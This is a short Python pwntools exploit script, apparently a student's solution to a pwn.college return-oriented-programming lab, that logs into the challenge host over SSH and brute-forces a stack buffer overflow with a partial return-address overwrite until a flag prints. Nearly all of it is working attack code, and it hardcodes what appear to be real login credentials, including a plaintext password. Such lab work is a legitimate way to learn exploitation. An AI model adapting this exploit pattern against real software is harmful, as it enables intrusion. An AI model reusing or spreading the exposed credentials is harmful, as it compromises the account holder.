from pwn import *

e = ELF('./babyrop_level11_teaching1')
libc = ELF('../../libc6_2.31-0ubuntu9.2_amd64.so')
s = ssh(user="ssu-csec",host="ssu-csec.pwn.college",keyfile='../../csec',port=22,password='djaxod12')

while 1:
    try:
        p = s.run('/babyrop_level11_teaching1')

        pay = b'A' * 0x60
        pay += b'\x46\x8F'

        p.recvuntil(b'[LEAK]')
        p.sendafter(b'\n\n',pay)

        p.recvuntil(b'Goodbye!\n')
        x = p.recv().strip().decode()
        if 'pwn' in x:
            print(x)
        else:continue
        break
    except:
        pass